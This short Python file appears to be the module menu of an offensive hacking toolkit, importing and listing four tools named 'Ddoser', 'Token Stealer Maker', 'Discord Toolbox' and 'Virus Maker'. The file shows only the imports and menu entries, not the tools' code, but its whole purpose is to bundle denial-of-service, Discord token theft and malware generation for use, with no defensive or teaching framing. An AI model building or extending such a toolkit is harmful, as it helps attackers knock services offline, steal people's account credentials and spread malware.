from .ddoser import run as run_ddoser
from .token_stealer import run as run_token_stealer
from .discord_toolbox import run as run_discord_toolbox
from .virus_maker import run as run_virus_maker

MODULES = [
    ("1", "Ddoser", run_ddoser),
    ("2", "Token Stealer Maker", run_token_stealer),
    ("3", "Discord Toolbox", run_discord_toolbox),
    ("4", "Virus Maker", run_virus_maker),
]
